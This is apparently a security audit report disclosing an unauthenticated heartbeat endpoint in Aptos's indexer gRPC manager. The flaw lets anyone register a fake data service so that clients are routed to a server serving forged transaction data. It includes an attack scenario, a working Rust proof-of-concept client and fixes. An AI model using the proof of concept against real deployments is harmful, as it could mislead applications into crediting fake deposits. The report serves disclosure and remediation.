# Audit Report

## Title
Unauthenticated Metadata Injection Enables Routing to Attacker-Controlled Data Services

## Summary
The GrpcManager's `heartbeat` endpoint accepts unauthenticated registration requests from any caller, allowing attackers to inject malicious data service addresses into the MetadataManager. Clients querying for data services are then routed to attacker-controlled servers that can serve poisoned transaction data, potentially enabling loss of funds in applications that trust indexer data without independent on-chain verification.

## Finding Description

The vulnerability exists in the indexer-grpc-manager service discovery mechanism. The attack flow is as follows:

**1. Unauthenticated Heartbeat Endpoint**

The GrpcManager exposes a public `heartbeat` RPC endpoint that accepts `HeartbeatRequest` messages from any caller without authentication or authorization: [1](#0-0) [2](#0-1) 

**2. Arbitrary Address Registration**

When a heartbeat is received, the service extracts the attacker-provided address and info without validation: [3](#0-2) 

The MetadataManager then routes the request to the appropriate handler based on the info type: [4](#0-3) 

**3. Automatic Client Creation to Attacker Address**

For `LiveDataServiceInfo`, the handler creates a gRPC client to the attacker-controlled address and registers it as a legitimate data service: [5](#0-4) 

Note that the `LiveDataService::new(address)` constructor creates a gRPC channel to the attacker's address: [6](#0-5) 

The same pattern exists for historical data services: [7](#0-6) 

**4. Malicious Service Selection**

When clients request a data service, the GrpcManager selects from the registered services (including the attacker's) using a weighted random selection: [8](#0-7) 

The selection logic treats all registered services equally: [9](#0-8) 

**5. Client Data Poisoning**

The client receives the attacker's address and connects directly to the malicious server, which can then serve arbitrary poisoned transaction data.

**Attack Scenario:**

```
1. Attacker sends: HeartbeatRequest {
     service_info: ServiceInfo {
       address: "http://attacker.com:50051",
       info: LiveDataServiceInfo {
         chain_id: <target_chain>,
         known_latest_version: <high_value>,
         min_servable_version: 0,
         ...
       }
     }
   }

2. GrpcManager registers "http://attacker.com:50051" as legitimate service

3. Legitimate user calls GetDataServiceForRequest

4. GrpcManager may return attacker's address

5. User connects to attacker's server

6. Attacker serves fake transaction data showing non-existent deposits

7. DApp credits user based on fake data â†’ loss of funds
```

**Missing Security Controls:**

- No authentication/authorization on heartbeat endpoint
- No validation of service addresses (no IP whitelisting, no TLS certificate verification)
- No chain_id validation against the MetadataManager's configured chain_id
- No rate limiting or registration quotas
- No operator approval required for new service registration [10](#0-9) 

## Impact Explanation

**Severity: High** (with potential for Critical in specific deployment scenarios)

This vulnerability enables **transaction data manipulation** for all clients using the affected GrpcManager instance. The impact includes:

1. **Application-Level Loss of Funds**: DApps that trust indexer data without independent on-chain verification could be exploited. For example:
   - DEX frontends showing fake swap confirmations
   - NFT marketplaces displaying non-existent transfers
   - Payment processors crediting deposits that never occurred
   - Wallet applications showing incorrect balances

2. **User Deception**: End users could be tricked into believing transactions occurred when they did not, enabling:
   - Social engineering attacks
   - Phishing campaigns with "verified" fake transactions
   - Reputational damage to Aptos ecosystem

3. **Service Disruption**: Attacker could serve error responses or slow data, causing:
   - API timeouts and failures
   - Degraded user experience
   - Service outages for dependent applications

Per Aptos Bug Bounty criteria, this qualifies as **High Severity** due to:
- "API crashes" - attacker can cause clients to fail
- "Significant protocol violations" - breaks the trusted service discovery protocol

It approaches **Critical Severity** if production DApps with significant TVL rely on this indexer data without independent verification, as this could lead to "Loss of Funds".

**Important Note**: This vulnerability does NOT affect consensus, validator nodes, or the core blockchain. It affects the indexer infrastructure layer used by external applications.

## Likelihood Explanation

**Likelihood: High**

This vulnerability is highly likely to be exploited because:

1. **Low Attack Complexity**: The attack requires only:
   - Network access to the GrpcManager's public endpoint (typically exposed)
   - Ability to send a single gRPC request
   - A server to receive misdirected client connections

2. **No Special Privileges Required**: Any network peer can send the malicious heartbeat

3. **No Detection Mechanisms**: There is no logging or alerting for suspicious registrations

4. **Production Exposure**: If this service is deployed in production (which is likely given it's in the official Aptos Core repository), it is immediately exploitable

5. **High Attacker Motivation**: Transaction data manipulation can enable:
   - Direct financial gain through DApp exploitation
   - Reputational attacks on the Aptos ecosystem
   - Competitive advantage for malicious indexer operators

The only factors reducing likelihood are:
- Defense-in-depth: Well-designed DApps should verify critical transactions on-chain
- Network segmentation: Some deployments may have firewall rules (but this is not guaranteed)

## Recommendation

Implement multiple layers of defense:

**1. Require Authentication for Service Registration**

Add mutual TLS authentication or API key verification:

```rust
// In service.rs
async fn heartbeat(
    &self,
    request: Request<HeartbeatRequest>,
) -> Result<Response<HeartbeatResponse>, Status> {
    // Verify TLS client certificate or API key
    let metadata = request.metadata();
    if !self.verify_service_credentials(metadata) {
        return Err(Status::unauthenticated("Invalid service credentials"));
    }
    
    // ... rest of implementation
}
```

**2. Whitelist Allowed Service Addresses**

Add configuration-based allowlisting:

```rust
// In config.rs
pub struct IndexerGrpcManagerConfig {
    // ... existing fields
    pub(crate) allowed_data_service_addresses: Vec<GrpcAddress>,
}

// In metadata_manager.rs - handle_live_data_service_info
fn handle_live_data_service_info(
    &self,
    address: GrpcAddress,
    mut info: LiveDataServiceInfo,
) -> Result<()> {
    // Validate address is in allowlist
    if !self.is_address_allowed(&address) {
        bail!("Data service address not in allowlist: {}", address);
    }
    
    // Validate chain_id matches
    if info.chain_id != self.chain_id {
        bail!("Chain ID mismatch: expected {}, got {}", self.chain_id, info.chain_id);
    }
    
    // ... rest of implementation
}
```

**3. Validate Chain ID**

Enforce chain_id matching:

```rust
fn handle_live_data_service_info(
    &self,
    address: GrpcAddress,
    mut info: LiveDataServiceInfo,
) -> Result<()> {
    ensure!(
        info.chain_id == self.chain_id,
        "Chain ID mismatch: service reports {} but manager expects {}",
        info.chain_id,
        self.chain_id
    );
    // ... rest of implementation
}
```

**4. Implement Rate Limiting and Monitoring**

- Limit registrations per IP address
- Alert on new service registrations
- Log all heartbeat attempts with source IP

**5. Document Security Model**

Clearly document that:
- Indexer data should not be trusted for critical operations without on-chain verification
- DApps must independently verify high-value transactions
- The GrpcManager is designed for trusted internal networks, not public internet exposure

## Proof of Concept

```rust
// Exploit PoC - attacker_client.rs
use aptos_protos::indexer::v1::{
    grpc_manager_client::GrpcManagerClient,
    service_info::Info,
    LiveDataServiceInfo, HeartbeatRequest, ServiceInfo,
};
use tonic::Request;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Connect to victim GrpcManager
    let mut client = GrpcManagerClient::connect("http://victim-grpc-manager:50051").await?;
    
    // Inject malicious data service
    let malicious_heartbeat = HeartbeatRequest {
        service_info: Some(ServiceInfo {
            address: Some("http://attacker-controlled-server:50051".to_string()),
            info: Some(Info::LiveDataServiceInfo(LiveDataServiceInfo {
                chain_id: 1, // mainnet
                timestamp: Some(aptos_indexer_grpc_utils::timestamp_now_proto()),
                known_latest_version: Some(1000000000), // claim high version
                stream_info: None,
                min_servable_version: Some(0), // claim to serve all versions
            })),
        }),
    };
    
    // Send malicious registration
    let response = client.heartbeat(Request::new(malicious_heartbeat)).await?;
    println!("Malicious service registered! Response: {:?}", response);
    
    // Now legitimate users calling get_data_service_for_request 
    // may be routed to attacker-controlled-server:50051
    
    Ok(())
}

// On attacker-controlled-server:50051, run a malicious DataService that:
// - Accepts GetTransactions requests
// - Returns fabricated transaction data
// - Logs victim requests for intelligence gathering
```

**Testing Steps:**

1. Deploy GrpcManager with default configuration
2. Run attacker client to inject malicious service address
3. Run legitimate client requesting data service
4. Observe that legitimate client may receive attacker's address
5. Verify attacker server receives connection from legitimate client
6. Confirm attacker can serve arbitrary transaction data

## Notes

- This vulnerability is in the **indexer infrastructure**, not the core consensus layer
- It does NOT affect validator nodes or blockchain state
- Impact depends on how downstream applications use the indexer data
- Well-architected DApps that verify critical transactions on-chain are protected
- This issue highlights the importance of defense-in-depth and zero-trust architecture
- The lack of authentication suggests this service may have been designed for trusted internal networks but could be exposed publicly in some deployments

### Citations

**File:** protos/proto/aptos/indexer/v1/grpc.proto (L74-76)
```text
message HeartbeatRequest {
  optional ServiceInfo service_info = 1;
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L35-45)
```rust
    async fn handle_heartbeat(
        &self,
        address: String,
        info: Info,
    ) -> anyhow::Result<Response<HeartbeatResponse>> {
        self.metadata_manager.handle_heartbeat(address, info)?;

        Ok(Response::new(HeartbeatResponse {
            known_latest_version: Some(self.metadata_manager.get_known_latest_version()),
        }))
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L71-88)
```rust
    fn pick_live_data_service(&self, starting_version: u64) -> Option<String> {
        let mut candidates = vec![];
        for candidate in self.metadata_manager.get_live_data_services_info() {
            if let Some(info) = candidate.1.back().as_ref() {
                // TODO(grao): Handle the case when the requested starting version is beyond the
                // latest version.
                if info.min_servable_version.is_none()
                    || starting_version < info.min_servable_version.unwrap()
                {
                    continue;
                }
                let num_active_streams = info.stream_info.as_ref().unwrap().active_streams.len();
                candidates.push((candidate.0, num_active_streams));
            }
        }

        Self::pick_data_service_from_candidate(candidates)
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L110-127)
```rust
    async fn heartbeat(
        &self,
        request: Request<HeartbeatRequest>,
    ) -> Result<Response<HeartbeatResponse>, Status> {
        let request = request.into_inner();
        if let Some(service_info) = request.service_info {
            if let Some(address) = service_info.address {
                if let Some(info) = service_info.info {
                    return self
                        .handle_heartbeat(address, info)
                        .await
                        .map_err(|e| Status::internal(format!("Error handling heartbeat: {e}")));
                }
            }
        }

        Err(Status::invalid_argument("Bad request."))
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L148-196)
```rust
    async fn get_data_service_for_request(
        &self,
        request: Request<GetDataServiceForRequestRequest>,
    ) -> Result<Response<GetDataServiceForRequestResponse>, Status> {
        let request = request.into_inner();

        if request.user_request.is_none()
            || request
                .user_request
                .as_ref()
                .unwrap()
                .starting_version
                .is_none()
        {
            let candidates = self.metadata_manager.get_live_data_services_info();
            if let Some(candidate) = candidates.iter().next() {
                let data_service_address = candidate.0.clone();
                return Ok(Response::new(GetDataServiceForRequestResponse {
                    data_service_address,
                }));
            } else {
                return Err(Status::internal(
                    "Cannot find a data service instance to serve the provided request.",
                ));
            }
        }

        let starting_version = request.user_request.unwrap().starting_version();

        let data_service_address =
            // TODO(grao): Use a simple strategy for now. Consider to make it smarter in the
            // future.
            if let Some(address) = self.pick_live_data_service(starting_version) {
                COUNTER.with_label_values(&["live_data_service_picked"]).inc();
                address
            } else if let Some(address) = self.pick_historical_data_service(starting_version).await {
                COUNTER.with_label_values(&["historical_data_service_picked"]).inc();
                address
            } else {
                COUNTER.with_label_values(&["failed_to_pick_data_service"]).inc();
                return Err(Status::internal(
                    "Cannot find a data service instance to serve the provided request.",
                ));
            };

        Ok(Response::new(GetDataServiceForRequestResponse {
            data_service_address,
        }))
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L88-102)
```rust
impl LiveDataService {
    fn new(address: GrpcAddress) -> Self {
        let channel = Channel::from_shared(address)
            .expect("Bad address.")
            .connect_lazy();
        let client = DataServiceClient::new(channel)
            .send_compressed(CompressionEncoding::Zstd)
            .accept_compressed(CompressionEncoding::Zstd)
            .max_encoding_message_size(MAX_MESSAGE_SIZE)
            .max_decoding_message_size(MAX_MESSAGE_SIZE);
        Self {
            client,
            recent_states: VecDeque::new(),
        }
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L140-165)
```rust
    pub(crate) fn new(
        chain_id: u64,
        self_advertised_address: GrpcAddress,
        grpc_manager_addresses: Vec<GrpcAddress>,
        fullnode_addresses: Vec<GrpcAddress>,
        master_address: Option<GrpcAddress>,
    ) -> Self {
        let grpc_managers = DashMap::new();
        for address in grpc_manager_addresses {
            grpc_managers.insert(address.clone(), Peer::new(address));
        }
        let fullnodes = DashMap::new();
        for address in fullnode_addresses {
            fullnodes.insert(address.clone(), Fullnode::new(address));
        }
        Self {
            chain_id,
            self_advertised_address,
            grpc_managers,
            fullnodes,
            live_data_services: DashMap::new(),
            historical_data_services: DashMap::new(),
            known_latest_version: AtomicU64::new(0),
            master_address: Mutex::new(master_address),
        }
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L330-339)
```rust
    pub(crate) fn handle_heartbeat(&self, address: GrpcAddress, info: Info) -> Result<()> {
        match info {
            Info::LiveDataServiceInfo(info) => self.handle_live_data_service_info(address, info),
            Info::HistoricalDataServiceInfo(info) => {
                self.handle_historical_data_service_info(address, info)
            },
            Info::FullnodeInfo(info) => self.handle_fullnode_info(address, info),
            Info::GrpcManagerInfo(info) => self.handle_grpc_manager_info(address, info),
        }
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L489-509)
```rust
    fn handle_live_data_service_info(
        &self,
        address: GrpcAddress,
        mut info: LiveDataServiceInfo,
    ) -> Result<()> {
        let mut entry = self
            .live_data_services
            .entry(address.clone())
            .or_insert(LiveDataService::new(address));
        if info.stream_info.is_none() {
            info.stream_info = Some(StreamInfo {
                active_streams: vec![],
            });
        }
        entry.value_mut().recent_states.push_back(info);
        if entry.value().recent_states.len() > MAX_NUM_OF_STATES_TO_KEEP {
            entry.value_mut().recent_states.pop_front();
        }

        Ok(())
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L511-531)
```rust
    fn handle_historical_data_service_info(
        &self,
        address: GrpcAddress,
        mut info: HistoricalDataServiceInfo,
    ) -> Result<()> {
        let mut entry = self
            .historical_data_services
            .entry(address.clone())
            .or_insert(HistoricalDataService::new(address));
        if info.stream_info.is_none() {
            info.stream_info = Some(StreamInfo {
                active_streams: vec![],
            });
        }
        entry.value_mut().recent_states.push_back(info);
        if entry.value().recent_states.len() > MAX_NUM_OF_STATES_TO_KEEP {
            entry.value_mut().recent_states.pop_front();
        }

        Ok(())
    }
```
